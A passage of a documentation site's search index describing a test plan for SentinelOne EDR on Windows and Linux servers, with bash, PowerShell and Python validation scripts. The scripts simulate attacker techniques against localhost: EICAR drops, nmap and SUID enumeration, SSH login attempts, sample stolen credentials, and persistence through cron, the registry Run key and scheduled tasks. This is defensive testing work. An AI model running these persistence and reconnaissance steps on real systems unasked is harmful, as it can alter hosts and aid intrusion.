\u2705 Kategori E: Performance Impact Testing \u2705 Kategori F: Integration Testing  </p>"},{"location":"testing/kategori-f-integration/#next-steps","title":"Next Steps","text":"<p>Continue to platform-specific documentation: - Windows Server Specific Testing - Linux Server Specific Testing - Cross-Platform Testing Scenarios</p> <p>Integration Validated</p> <p>Kategori F testing confirms SentinelOne seamlessly integrates with enterprise infrastructure, enabling centralized security management and maintaining compatibility with existing tools and processes.</p>"},{"location":"testing/testing-overview/","title":"Testing &amp; Validasi SentinelOne EDR","text":""},{"location":"testing/testing-overview/#overview","title":"Overview","text":"<p>Dokumentasi lengkap untuk testing dan validasi SentinelOne EDR pada Windows Server dan Linux Server dengan fokus pada proteksi maksimal dan anomali handling. Semua pengujian dirancang untuk demonstrasi komprehensif kepada stakeholder.</p>"},{"location":"testing/testing-overview/#scope-testing","title":"Scope Testing","text":""},{"location":"testing/testing-overview/#platform-target","title":"Platform Target","text":"<ul> <li>\u2705 Windows Server (2019, 2022, Core)</li> <li>\u2705 Linux Server (RHEL, Ubuntu Server, CentOS)</li> <li>\u26a0\ufe0f macOS (Monitoring only - endpoint biasa)</li> </ul>"},{"location":"testing/testing-overview/#environment-focus","title":"Environment Focus","text":"<ul> <li>Production Server Protection</li> <li>Critical Infrastructure Security</li> <li>High-Availability Systems</li> <li>Mission-Critical Applications</li> </ul>"},{"location":"testing/testing-overview/#struktur-pengujian","title":"Struktur Pengujian","text":""},{"location":"testing/testing-overview/#pengujian-kategori-a-proteksi-real-time","title":"\ud83d\udd25 Pengujian Kategori A: Proteksi Real-Time","text":"<ul> <li>A1: Malware Detection &amp; Response</li> <li>A2: Behavioral Analysis Testing</li> <li>A3: Zero-Day Threat Simulation</li> <li>A4: Fileless Attack Prevention</li> </ul>"},{"location":"testing/testing-overview/#pengujian-kategori-b-skenario-offline","title":"\ud83c\udf10 Pengujian Kategori B: Skenario Offline","text":"<ul> <li>B1: Offline Malware Detection</li> <li>B2: Offline Uninstall Attempts</li> <li>B3: Network Disconnection Response</li> <li>B4: Cached Policy Enforcement</li> </ul>"},{"location":"testing/testing-overview/#pengujian-kategori-c-operational-resilience","title":"\ud83d\udee0\ufe0f Pengujian Kategori C: Operational Resilience","text":"<ul> <li>C1: Service Recovery Testing</li> <li>C2: Resource Exhaustion Scenarios</li> <li>C3: System Reboot Validation</li> <li>C4: Update Failure Recovery</li> </ul>"},{"location":"testing/testing-overview/#pengujian-kategori-d-security-hardening","title":"\ud83d\udd12 Pengujian Kategori D: Security Hardening","text":"<ul> <li>D1: Tamper Protection Testing</li> <li>D2: Privilege Escalation Prevention</li> <li>D3: Agent Self-Protection</li> <li>D4: Configuration Integrity</li> </ul>"},{"location":"testing/testing-overview/#pengujian-kategori-e-performance-impact","title":"\ud83d\udcca Pengujian Kategori E: Performance Impact","text":"<ul> <li>E1: CPU/Memory Utilization</li> <li>E2: Disk I/O Impact</li> <li>E3: Network Latency Testing</li> <li>E4: Application Performance</li> </ul>"},{"location":"testing/testing-overview/#pengujian-kategori-f-integration-testing","title":"\ud83d\udd04 Pengujian Kategori F: Integration Testing","text":"<ul> <li>F1: SIEM Integration</li> <li>F2: Active Directory Integration</li> <li>F3: Third-party Tool Compatibility</li> <li>F4: API Functionality</li> </ul>"},{"location":"testing/testing-overview/#timeline-pengujian-demonstrasi","title":"Timeline Pengujian Demonstrasi","text":""},{"location":"testing/testing-overview/#week-1-preparation-baseline","title":"Week 1: Preparation &amp; Baseline","text":"<pre><code>Day 1-2: Environment Setup\nDay 3-4: Baseline Performance\nDay 5-7: Documentation Prep\n</code></pre>"},{"location":"testing/testing-overview/#week-2-core-testing","title":"Week 2: Core Testing","text":"<pre><code>Day 1-2: Kategori A (Real-Time Protection)\nDay 3-4: Kategori B (Offline Scenarios)\nDay 5-7: Kategori C (Operational Resilience)\n</code></pre>"},{"location":"testing/testing-overview/#week-3-advanced-testing","title":"Week 3: Advanced Testing","text":"<pre><code>Day 1-2: Kategori D (Security Hardening)\nDay 3-4: Kategori E (Performance Impact)\nDay 5-7: Kategori F (Integration Testing)\n</code></pre>"},{"location":"testing/testing-overview/#week-4-documentation-demo-prep","title":"Week 4: Documentation &amp; Demo Prep","text":"<pre><code>Day 1-3: Results Compilation\nDay 4-5: Demo Preparation\nDay 6-7: Stakeholder Presentation\n</code></pre>"},{"location":"testing/testing-overview/#kriteria-keberhasilan","title":"Kriteria Keberhasilan","text":""},{"location":"testing/testing-overview/#gold-standard-metrics","title":"Gold Standard Metrics","text":"Metrik Windows Server Linux Server Target Detection Rate &gt;99.5% &gt;99.5% &gt;99% Response Time &lt;3s &lt;3s &lt;5s False Positive &lt;0.5% &lt;0.5% &lt;1% CPU Impact &lt;5% &lt;5% &lt;10% Memory Impact &lt;200MB &lt;150MB &lt;500MB"},{"location":"testing/testing-overview/#business-impact-validation","title":"Business Impact Validation","text":"<ul> <li>\u2705 Zero service interruption during normal operations</li> <li>\u2705 Minimal performance degradation</li> <li>\u2705 Complete offline protection capability</li> <li>\u2705 Rapid threat response and containment</li> <li>\u2705 Comprehensive audit trail for compliance</li> </ul>"},{"location":"testing/testing-overview/#dokumentasi-deliverables","title":"Dokumentasi Deliverables","text":""},{"location":"testing/testing-overview/#1-technical-documentation","title":"1. Technical Documentation","text":"<ul> <li>Detailed test procedures per kategori</li> <li>Results and findings report</li> <li>Performance benchmarking data</li> <li>Configuration recommendations</li> </ul>"},{"location":"testing/testing-overview/#2-executive-presentation","title":"2. Executive Presentation","text":"<ul> <li>Executive summary dashboard</li> <li>Risk assessment matrix</li> <li>ROI justification</li> <li>Implementation roadmap</li> </ul>"},{"location":"testing/testing-overview/#3-demo-materials","title":"3. Demo Materials","text":"<ul> <li>Live demonstration scripts</li> <li>Video recordings of key tests</li> <li>Before/after comparisons</li> <li>Incident response workflows</li> </ul>"},{"location":"testing/testing-overview/#quick-navigation","title":"Quick Navigation","text":""},{"location":"testing/testing-overview/#platform-specific-testing","title":"Platform-Specific Testing","text":"<ul> <li>Windows Server Testing</li> <li>Linux Server Testing</li> <li>Cross-Platform Scenarios</li> </ul>"},{"location":"testing/testing-overview/#testing-categories","title":"Testing Categories","text":"<ul> <li>Kategori A: Real-Time Protection</li> <li>Kategori B: Offline Scenarios</li> <li>Kategori C: Operational Resilience</li> <li>Kategori D: Security Hardening</li> <li>Kategori E: Performance Impact</li> <li>Kategori F: Integration Testing</li> </ul> <p>Demo Ready Checklist</p> <p>Semua pengujian dirancang untuk memberikan confidence penuh kepada stakeholder bahwa SentinelOne EDR memberikan proteksi maksimal untuk infrastruktur server kritis.</p>"},{"location":"testing/cross-platform/cross-platform-testing/","title":"Cross-Platform Testing Scenarios","text":""},{"location":"testing/cross-platform/cross-platform-testing/#overview","title":"Overview","text":"<p>Dokumentasi testing scenarios yang melibatkan multiple platform (Windows &amp; Linux) untuk memvalidasi konsistensi protection, management, dan integration SentinelOne EDR dalam mixed environment enterprise.</p>"},{"location":"testing/cross-platform/cross-platform-testing/#mixed-environment-architecture","title":"\ud83c\udfe2 Mixed Environment Architecture","text":""},{"location":"testing/cross-platform/cross-platform-testing/#typical-enterprise-scenarios","title":"Typical Enterprise Scenarios","text":"<ul> <li>Hybrid Infrastructure: Windows Domain Controllers + Linux Web/DB servers</li> <li>DevOps Environment: Linux development servers + Windows workstations  </li> <li>Multi-tier Applications: Windows frontend + Linux backend services</li> <li>Container Orchestration: Linux Kubernetes + Windows worker nodes</li> <li>Legacy Systems: Mixed Windows/Linux server environments</li> </ul>"},{"location":"testing/cross-platform/cross-platform-testing/#testing-scope","title":"Testing Scope","text":"<ul> <li>Policy Consistency across platforms</li> <li>Centralized Management effectiveness</li> <li>Cross-platform Communication security</li> <li>Incident Response coordination</li> <li>Performance Impact comparison</li> </ul>"},{"location":"testing/cross-platform/cross-platform-testing/#cross-platform-security-testing","title":"\ud83d\udd10 Cross-Platform Security Testing","text":""},{"location":"testing/cross-platform/cross-platform-testing/#unified-policy-enforcement","title":"Unified Policy Enforcement","text":""},{"location":"testing/cross-platform/cross-platform-testing/#policy-consistency-validation","title":"Policy Consistency Validation","text":"<pre><code>#!/bin/bash\necho \"=== CROSS-PLATFORM POLICY CONSISTENCY TESTING ===\"\n\n# This script should be run on both Windows (via Git Bash/WSL) and Linux\n\n# Define test parameters\nTEST_ID=\"CROSS_PLATFORM_$(date +%Y%m%d_%H%M%S)\"\nPLATFORM=$(uname -s)\n\necho \"Platform: $PLATFORM\"\necho \"Test ID: $TEST_ID\"\n\n# Function to get SentinelOne policy info\nget_policy_info() {\n    echo \"Getting SentinelOne policy information...\"\n\n    if [[ \"$PLATFORM\" == *\"NT\"* ]] || [[ \"$PLATFORM\" == *\"MSYS\"* ]] || [[ \"$PLATFORM\" == *\"Windows\"* ]]; then\n        # Windows\n        sentinelctl.exe status | grep -i policy\n        sentinelctl.exe policy list 2&gt;/dev/null || echo \"Policy list not available\"\n    else\n        # Linux\n        sudo /opt/sentinelone/bin/sentinelctl status | grep -i policy\n        sudo /opt/sentinelone/bin/sentinelctl policy list 2&gt;/dev/null || echo \"Policy list not available\"\n    fi\n}\n\n# Function to test EICAR detection\ntest_eicar_detection() {\n    echo \"Testing EICAR detection consistency...\"\n\n    EICAR_STRING='X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'\n    TEST_FILE=\"/tmp/cross_platform_eicar_${TEST_ID}.txt\"\n\n    # Create EICAR file\n    echo \"$EICAR_STRING\" &gt; \"$TEST_FILE\"\n\n    # Measure detection time\n    START_TIME=$(date +%s)\n\n    # Wait for detection (max 30 seconds)\n    for i in {1..30}; do\n        if [ ! -f \"$TEST_FILE\" ]; then\n            END_TIME=$(date +%s)\n            DETECTION_TIME=$((END_TIME - START_TIME))\n            echo \"\u2705 EICAR detected and quarantined in ${DETECTION_TIME}s on $PLATFORM\"\n            return 0\n        fi\n        sleep 1\n    done\n\n    echo \"\u274c EICAR not detected within 30 seconds on $PLATFORM\"\n    rm -f \"$TEST_FILE\" 2&gt;/dev/null\n    return 1\n}\n\n# Function to test behavior monitoring\ntest_behavior_monitoring() {\n    echo \"Testing behavioral monitoring...\"\n\n    # Create suspicious process behavior\n    SUSPICIOUS_SCRIPT=\"/tmp/suspicious_${TEST_ID}.sh\"\n\n    cat &gt; \"$SUSPICIOUS_SCRIPT\" &lt;&lt; 'EOF'\n#!/bin/bash\n# Suspicious activity simulation\nwhoami\nid\nps aux | head -10\nnetstat -an | head -5\nEOF\n\n    chmod +x \"$SUSPICIOUS_SCRIPT\"\n\n    echo \"Executing suspicious script...\"\n    \"$SUSPICIOUS_SCRIPT\"\n\n    # Clean up\n    rm -f \"$SUSPICIOUS_SCRIPT\"\n\n    echo \"\u2705 Behavioral monitoring test completed on $PLATFORM\"\n}\n\n# Execute tests\necho \"Starting cross-platform consistency tests...\"\n\nget_policy_info\necho \"---\"\n\ntest_eicar_detection\necho \"---\"\n\ntest_behavior_monitoring\necho \"---\"\n\necho \"Cross-platform testing completed for $PLATFORM\"\n</code></pre>"},{"location":"testing/cross-platform/cross-platform-testing/#powershell-cross-platform-testing","title":"PowerShell Cross-Platform Testing","text":"<pre><code># Cross-platform PowerShell testing (works on Windows/Linux with PowerShell Core)\nparam(\n    [string]$TestId = \"CROSS_PS_$(Get-Date -Format 'yyyyMMdd_HHmmss')\"\n)\n\nWrite-Host \"=== CROSS-PLATFORM POWERSHELL TESTING ===\" -ForegroundColor Cyan\nWrite-Host \"Platform: $($PSVersionTable.Platform)\" -ForegroundColor Yellow\nWrite-Host \"PowerShell Version: $($PSVersionTable.PSVersion)\" -ForegroundColor Yellow\n\n# Function to get OS-specific SentinelOne path\nfunction Get-SentinelPath {\n    if ($IsWindows -or $PSVersionTable.PSVersion.Major -lt 6) {\n        return \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\sentinelctl.exe\"\n    } else {\n        return \"/opt/sentinelone/bin/sentinelctl\"\n    }\n}\n\n# Function to test SentinelOne status across platforms\nfunction Test-SentinelStatus {\n    Write-Host \"Testing SentinelOne status...\" -ForegroundColor Yellow\n\n    $sentinelPath = Get-SentinelPath\n\n    if (Test-Path $sentinelPath) {\n        try {\n            if ($IsWindows -or $PSVersionTable.PSVersion.Major -lt 6) {\n                $status = &amp; $sentinelPath status\n            } else {\n                $status = sudo $sentinelPath status\n            }\n\n            Write-Host \"\u2705 SentinelOne status retrieved successfully\" -ForegroundColor Green\n            $status | Select-String \"Agent.*Connected|Status.*Protected\" | Write-Host\n        }\n        catch {\n            Write-Host \"\u274c Failed to get SentinelOne status: $($_.Exception.Message)\" -ForegroundColor Red\n        }\n    } else {\n        Write-Host \"\u274c SentinelOne binary not found at: $sentinelPath\" -ForegroundColor Red\n    }\n}\n\n# Function to test cross-platform file operations\nfunction Test-CrossPlatformFileOps {\n    Write-Host \"Testing cross-platform file operations...\" -ForegroundColor Yellow\n\n    $testDir = if ($IsWindows -or $PSVersionTable.PSVersion.Major -lt 6) { \"C:\\temp\" } else { \"/tmp\" }\n    $testFile = Join-Path $testDir \"cross_platform_test_$TestId.txt\"\n\n    try {\n        # Create test file\n        \"Cross-platform test content - $(Get-Date)\" | Out-File -FilePath $testFile -Encoding UTF8\n\n        if (Test-Path $testFile) {\n            Write-Host \"\u2705 File created successfully: $testFile\" -ForegroundColor Green\n\n            # Test file access\n            $content = Get-Content $testFile\n            Write-Host \"File content: $content\" -ForegroundColor Gray\n\n            # Clean up\n            Remove-Item $testFile -Force\n            Write-Host \"\u2705 File cleanup completed\" -ForegroundColor Green\n        }\n    }\n    catch {\n        Write-Host \"\u274c File operation failed: $($_.Exception.Message)\" -ForegroundColor Red\n    }\n}\n\n# Function to test network connectivity\nfunction Test-NetworkConnectivity {\n    Write-Host \"Testing network connectivity...\" -ForegroundColor Yellow\n\n    $testHosts = @(\"8.8.8.8\", \"google.com\", \"github.com\")\n\n    foreach ($host in $testHosts) {\n        try {\n            $result = Test-Connection -ComputerName $host -Count 1 -Quiet\n            if ($result) {\n                Write-Host \"\u2705 Connectivity to $host: OK\" -ForegroundColor Green\n            } else {\n                Write-Host \"\u274c Connectivity to $host: FAILED\" -ForegroundColor Red\n            }\n        }\n        catch {\n            Write-Host \"\u274c Network test to $host failed: $($_.Exception.Message)\" -ForegroundColor Red\n        }\n    }\n}\n\n# Execute tests\nWrite-Host \"Starting cross-platform PowerShell tests...\" -ForegroundColor Cyan\n\nTest-SentinelStatus\nWrite-Host \"---\"\n\nTest-CrossPlatformFileOps  \nWrite-Host \"---\"\n\nTest-NetworkConnectivity\nWrite-Host \"---\"\n\nWrite-Host \"Cross-platform PowerShell testing completed\" -ForegroundColor Cyan\n</code></pre>"},{"location":"testing/cross-platform/cross-platform-testing/#multi-platform-attack-scenarios","title":"\ud83c\udf10 Multi-Platform Attack Scenarios","text":""},{"location":"testing/cross-platform/cross-platform-testing/#coordinated-attack-simulation","title":"Coordinated Attack Simulation","text":""},{"location":"testing/cross-platform/cross-platform-testing/#windows-to-linux-lateral-movement","title":"Windows-to-Linux Lateral Movement","text":"<pre><code>#!/bin/bash\necho \"=== WINDOWS-TO-LINUX LATERAL MOVEMENT TESTING ===\"\n\n# Simulate lateral movement from compromised Windows box to Linux server\n# This tests SentinelOne's ability to detect cross-platform attack chains\n\n# Phase 1: Simulate Windows compromise indicators\necho \"Phase 1: Simulating Windows compromise indicators...\"\n\n# Create fake Windows-style artifacts on Linux (for testing)\nWINDOWS_ARTIFACTS_DIR=\"/tmp/windows_artifacts\"\nmkdir -p \"$WINDOWS_ARTIFACTS_DIR\"\n\n# Simulate stolen credentials file\ncat &gt; \"$WINDOWS_ARTIFACTS_DIR/credentials.txt\" &lt;&lt; 'EOF'\n# Simulated stolen credentials (for testing only)\ndomain\\administrator:P@ssw0rd123\ndomain\\sqlservice:ServiceAccount1\nlinuxuser:ubuntu123\nEOF\n\n# Simulate network enumeration from Windows\necho \"Phase 2: Network enumeration simulation...\"\n\n# Test if SentinelOne detects network scanning\nnmap -sT localhost 2&gt;/dev/null | head -10\n\n# Simulate SSH brute force (safe simulation)\necho \"Phase 3: SSH access attempt simulation...\"\n\n# Create script that simulates SSH login attempts\ncat &gt; \"$WINDOWS_ARTIFACTS_DIR/ssh_attack.sh\" &lt;&lt; 'EOF'\n#!/bin/bash\n# Simulated SSH brute force (doesn't actually connect)\necho \"Simulating SSH login attempts...\"\nfor user in admin root administrator; do\n    echo \"Attempting SSH connection as $user...\"\n    # Simulate failed attempt (don't actually connect)\n    ssh -o ConnectTimeout=1 -o BatchMode=yes \"$user@127.0.0.1\" echo \"test\" 2&gt;/dev/null || true\n    sleep 1\ndone\nEOF\n\nchmod +x \"$WINDOWS_ARTIFACTS_DIR/ssh_attack.sh\"\n\"$WINDOWS_ARTIFACTS_DIR/ssh_attack.sh\"\n\n# Phase 4: Simulate privilege escalation attempt\necho \"Phase 4: Privilege escalation simulation...\"\n\n# Test various escalation techniques (safely)\necho \"Testing sudo enumeration...\"\nsudo -l 2&gt;/dev/null || echo \"Sudo enumeration blocked or not available\"\n\n# Test SUID binary enumeration\necho \"SUID binary enumeration:\"\nfind /usr/bin -perm -4000 -type f 2&gt;/dev/null | head -5\n\n# Phase 5: Simulate persistence attempt  \necho \"Phase 5: Persistence mechanism simulation...\"\n\n# Try to modify system startup scripts\nPERSISTENCE_TEST_FILE=\"/etc/cron.d/malicious_cron\"\necho \"# Malicious cron job (test)\" &gt; \"$PERSISTENCE_TEST_FILE\" 2&gt;/dev/null\n\nif [ -f \"$PERSISTENCE_TEST_FILE\" ]; then\n    echo \"\u274c Persistence mechanism created - SECURITY RISK!\"\n    rm -f \"$PERSISTENCE_TEST_FILE\"\nelse\n    echo \"\u2705 Persistence mechanism blocked\"\nfi\n\n# Cleanup\nrm -rf \"$WINDOWS_ARTIFACTS_DIR\"\n\necho \"Lateral movement simulation completed\"\n</code></pre>"},{"location":"testing/cross-platform/cross-platform-testing/#linux-to-windows-pivot-simulation","title":"Linux-to-Windows Pivot Simulation","text":"<pre><code># Simulate Linux-to-Windows pivot attack\nWrite-Host \"=== LINUX-TO-WINDOWS PIVOT SIMULATION ===\" -ForegroundColor Cyan\n\n# Phase 1: Simulate Linux server compromise\nWrite-Host \"Phase 1: Simulating Linux server compromise indicators...\" -ForegroundColor Yellow\n\n# Create fake Linux artifacts (for testing on Windows)\n$linuxArtifactsPath = \"C:\\temp\\linux_artifacts\"\nif (!(Test-Path $linuxArtifactsPath)) {\n    New-Item -ItemType Directory -Path $linuxArtifactsPath -Force\n}\n\n# Simulate stolen SSH keys\n$fakeSSHKey = @\"\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA7tFakeKeyContentForTestingOnly...\n(This is a fake SSH key for testing purposes)\n-----END RSA PRIVATE KEY-----\n\"@\n\n$fakeSSHKey | Out-File \"$linuxArtifactsPath\\id_rsa_stolen\" -Encoding ASCII\n\n# Phase 2: Network enumeration from compromised Linux box\nWrite-Host \"Phase 2: Network enumeration simulation...\" -ForegroundColor Yellow\n\n# Simulate network discovery\n$networkTargets = @(\"127.0.0.1\", \"localhost\")\nforeach ($target in $networkTargets) {\n    Write-Host \"Scanning target: $target\"\n    Test-NetConnection -ComputerName $target -Port 3389 -InformationLevel Quiet\n    Test-NetConnection -ComputerName $target -Port 445 -InformationLevel Quiet\n}\n\n# Phase 3: Simulate credential stuffing\nWrite-Host \"Phase 3: Credential stuffing simulation...\" -ForegroundColor Yellow\n\n# Test with obviously fake credentials (won't actually authenticate)\n$fakeCredentials = @(\n    @{User=\"administrator\"; Pass=\"password123\"},\n    @{User=\"admin\"; Pass=\"admin123\"},\n    @{User=\"guest\"; Pass=\"guest\"}\n)\n\nforeach ($cred in $fakeCredentials) {\n    Write-Host \"Testing credential: $($cred.User)\"\n    # Don't actually attempt authentication, just simulate the attempt\n    try {\n        # This will fail safely without causing actual authentication attempts\n        $securePass = ConvertTo-SecureString $cred.Pass -AsPlainText -Force\n        $testCred = New-Object System.Management.Automation.PSCredential($cred.User, $securePass)\n        # Don't actually use the credential, just create it for testing\n        Write-Host \"Credential object created for testing\"\n    }\n    catch {\n        Write-Host \"\u2705 Credential creation blocked or failed safely\"\n    }\n}\n\n# Phase 4: Simulate Windows-specific attack techniques\nWrite-Host \"Phase 4: Windows-specific attack simulation...\" -ForegroundColor Yellow\n\n# Test registry enumeration\ntry {\n    Get-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" -Name \"ProductName\" | Out-Null\n    Write-Host \"Registry access successful\"\n}\ncatch {\n    Write-Host \"\u274c Registry access blocked\"\n}\n\n# Test WMI enumeration\ntry {\n    Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption | Out-Null\n    Write-Host \"WMI access successful\"\n}\ncatch {\n    Write-Host \"\u274c WMI access blocked or restricted\"\n}\n\n# Phase 5: Simulate persistence attempts\nWrite-Host \"Phase 5: Persistence mechanism testing...\" -ForegroundColor Yellow\n\n# Test registry persistence\ntry {\n    $regPath = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n    Set-ItemProperty -Path $regPath -Name \"TestPersistence\" -Value \"cmd.exe /c echo test\" -ErrorAction Stop\n\n    # Check if it was set\n    $testValue = Get-ItemProperty -Path $regPath -Name \"TestPersistence\" -ErrorAction SilentlyContinue\n    if ($testValue) {\n        Write-Host \"\u274c Registry persistence created - SECURITY RISK!\"\n        Remove-ItemProperty -Path $regPath -Name \"TestPersistence\" -ErrorAction SilentlyContinue\n    }\n}\ncatch {\n    Write-Host \"\u2705 Registry persistence blocked\"\n}\n\n# Test scheduled task persistence\ntry {\n    $taskName = \"TestPersistenceTask\"\n    $action = New-ScheduledTaskAction -Execute \"cmd.exe\" -Argument \"/c echo test\"\n    $trigger = New-ScheduledTaskTrigger -Daily -At \"12:00AM\"\n    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -ErrorAction Stop\n\n    # Check if task was created\n    $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue\n    if ($task) {\n        Write-Host \"\u274c Scheduled task persistence created - SECURITY RISK!\"\n        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue\n    }\n}\ncatch {\n    Write-Host \"\u2705 Scheduled task persistence blocked\"\n}\n\n# Cleanup\nRemove-Item -Path $linuxArtifactsPath -Recurse -Force -ErrorAction SilentlyContinue\n\nWrite-Host \"Linux-to-Windows pivot simulation completed\" -ForegroundColor Cyan\n</code></pre>"},{"location":"testing/cross-platform/cross-platform-testing/#cross-platform-performance-comparison","title":"\ud83d\udcca Cross-Platform Performance Comparison","text":""},{"location":"testing/cross-platform/cross-platform-testing/#unified-performance-monitoring","title":"Unified Performance Monitoring","text":"<pre><code>#!/usr/bin/env python3\n\"\"\"\nCross-Platform SentinelOne Performance Monitoring\nRequires: psutil (pip install psutil)\n\"\"\"\n\nimport psutil\nimport platform\nimport time\nimport json\nimport subprocess\nimport os\nfrom datetime import datetime\n\nclass CrossPlatformMonitor:\n    def __init__(self):\n        self.platform = platform.system()\n        self.hostname = platform.node()\n        self.start_time = datetime.now()\n\n    def get_sentinelone_processes(self):\n        \"\"\"Find all SentinelOne processes across platforms\"\"\"\n        sentinel_processes = []\n\n        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info', 'create_time']):\n            try:\n                if 'sentinel' in proc.info['name'].lower():\n                    sentinel_processes.append({\n                        'pid': proc.info['pid'],\n                        'name': proc.info['name'],\n                        'cpu_percent': proc.info['cpu_percent'],\n                        'memory_mb': proc.info['memory_info'].rss / 1024 / 1024,\n                        'create_time': proc.info['create_time']\n                    })\n            except (psutil.NoSuchProcess, psutil.AccessDenied):\n                continue\n\n        return sentinel_processes\n\n    def get_system_metrics(self):\n        \"\"\"Get cross-platform system metrics\"\"\"\n        return {\n            'cpu_percent': psutil.cpu_percent(interval=1),\n            'memory_percent': psutil.virtual_memory().percent,\n            'memory_available_mb': psutil.virtual_memory().available / 1024 / 1024,\n            'disk_usage_percent': psutil.disk_usage('/').percent if self.platform != 'Windows' else psutil.disk_usage('C:').percent,\n            'boot_time': psutil.boot_time(),\n            'load_average': os.getloadavg() if hasattr(os, 'getloadavg') else None\n        }\n\n    def get_network_stats(self):\n        \"\"\"Get network statistics\"\"\"\n        net_io = psutil.net_io_counters()\n        return {\n            'bytes_sent': net_io.bytes_sent,\n            'bytes_recv': net_io.bytes_recv,\n            'packets_sent': net_io.packets_sent,\n            'packets_recv': net_io.packets_recv\n        }\n\n    def run_eicar_test(self):\n        \"\"\"Run EICAR test and measure detection time\"\"\"\n        eicar_string = 'X5O!P%@AP[4\\\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'\n        test_file = f\"/tmp/eicar_test_{int(time.time())}.txt\" if self.platform != 'Windows' else f\"C:\\\\temp\\\\eicar_test_{int(time.time())}.txt\"\n\n        try:\n            # Create EICAR file\n            start_time = time.time()\n            with open(test_file, 'w') as f:\n                f.write(eicar_string)\n\n            # Wait for detection (max 30 seconds)\n            for i in range(30):\n                if not os.path.exists(test_file):\n                    detection_time = time.time() - start_time\n                    return {\n                        'detected': True,\n                        'detection_time': detection_time,\n                        'status': 'SUCCESS'\n                    }\n                time.sleep(1)\n\n            # Clean up if not detected\n            if os.path.exists(test_file):\n                os.remove(test_file)\n\n            return {\n                'detected': False,\n                'detection_time': 30,\n                'status': 'TIMEOUT'\n            }\n\n        except Exception as e:\n            return {\n                'detected': False,\n                'detection_time': 0,\n                'status': f'ERROR: {str(e)}'\n            }\n\n    def generate_report(self, duration_minutes=5):\n        \"\"\"Generate comprehensive cross-platform report\"\"\"\n        print(f\"=== CROSS-PLATFORM SENTINELONE MONITORING ===\")\n        print(f\"Platform: {self.platform}\")\n        print(f\"Hostname: {self.hostname}\")\n        print(f\"Start Time: {self.start_time}\")\n        print()\n\n        # Initial metrics\n        print(\"=== INITIAL SYSTEM STATE ===\")\n        system_metrics = self.get_system_metrics()\n        print(f\"CPU Usage: {system_metrics['cpu_percent']}%\")\n        print(f\"Memory Usage: {system_metrics['memory_percent']}%\")\n        print(f\"Available Memory: {system_metrics['memory_available_mb']:.1f} MB\")\n        print()\n\n        # SentinelOne processes\n        print(\"=== SENTINELONE PROCESSES ===\")\n        sentinel_procs = self.get_sentinelone_processes()\n        if sentinel_procs:\n            total_memory = sum(proc['memory_mb'] for proc in sentinel_procs)\n            print(f\"Found {len(sentinel_procs)} SentinelOne processes\")\n            print(f\"Total Memory Usage: {total_memory:.1f} MB\")\n            for proc in sentinel_procs:\n                print(f\"  PID {proc['pid']}: {proc['name']} - {proc['memory_mb']:.1f} MB\")\n        else:\n            print(\"No SentinelOne processes found\")\n        print()\n\n        # EICAR test\n        print(\"=== EICAR DETECTION TEST ===\")\n        eicar_result = self.run_eicar_test()\n        print(f\"Detection Result: {eicar_result['status']}\")\n        if eicar_result['detected']:\n            print(f\"Detection Time: {eicar_result['detection_time']:.2f} seconds\")\n        print()\n\n        # Performance monitoring\n        print(\"=== PERFORMANCE MONITORING ===\")\n        print(f\"Monitoring for {duration_minutes} minutes...\")\n\n        metrics_history = []\n        samples = duration_minutes * 2  # Sample every 30 seconds\n\n        for i in range(samples):\n            sample_metrics = {\n                'timestamp': time.time(),\n                'system': self.get_system_metrics(),\n                'sentinelone': self.get_sentinelone_processes(),\n                'network': self.get_network_stats()\n            }\n            metrics_history.append(sample_metrics)\n\n            if i % 4 == 0:  # Print every 2 minutes\n                print(f\"  Sample {i+1}/{samples}: CPU {sample_metrics['system']['cpu_percent']:.1f}%, \"\n                      f\"Memory {sample_metrics['system']['memory_percent']:.1f}%\")\n\n            time.sleep(30)\n\n        # Final analysis\n        print(\"\\n=== FINAL ANALYSIS ===\")\n        if metrics_history:\n            avg_cpu = sum(m['system']['cpu_percent'] for m in metrics_history) / len(metrics_history)\n            avg_memory = sum(m['system']['memory_percent'] for m in metrics_history) / len(metrics_history)\n\n            sentinel_memory_samples = []\n            for m in metrics_history:\n                if m['sentinelone']:\n                    total_mem = sum(proc['memory_mb'] for proc in m['sentinelone'])\n                    sentinel_memory_samples.append(total_mem)\n\n            avg_sentinel_memory = sum(sentinel_memory_samples) / len(sentinel_memory_samples) if sentinel_memory_samples else 0\n\n            print(f\"Average CPU Usage: {avg_cpu:.2f}%\")\n            print(f\"Average Memory Usage: {avg_memory:.2f}%\")\n            print(f\"Average SentinelOne Memory: {avg_sentinel_memory:.2f} MB\")\n\n        # Generate summary report\n        report = {\n            'platform': self.platform,\n            'hostname': self.hostname,\n            'test_duration': duration_minutes,\n            'eicar_test': eicar_result,\n            'performance_summary': {\n                'avg_cpu_percent': avg_cpu if 'avg_cpu' in locals() else 0,\n                'avg_memory_percent': avg_memory if 'avg_memory' in locals() else 0,\n                'avg_sentinelone_memory_mb': avg_sentinel_memory if 'avg_sentinel_memory' in locals() else 0\n            },\n            'sentinelone_processes': len(sentinel_procs),\n            'timestamp': datetime.now().isoformat()\n        }\n\n        # Save report\n        report_file = f\"sentinelone_report_{self.platform.lower()}_{int(time.time())}.json\"\n        with open(report_file, 'w') as f:\n            json.dump(report, f, indent=2)\n\n        print(f\"\\nDetailed report saved to: {report_file}\")\n        return report\n\nif __name__ == \"__main__\":\n    monitor = CrossPlatformMonitor()\n    monitor.generate_report(duration_minutes=5)\n</code></pre>"},{"location":"testing/cross-platform/cross-platform-testing/#integration-consistency-testing","title":"\ud83d\udd04 Integration Consistency Testing","text":""},{"location":"testing/cross-platform/cross-platform-testing/#siem-log-format-comparison","title":"SIEM Log Format Comparison","text":"<pre><code>#!/bin/bash\necho \"=== CROSS-PLATFORM SIEM 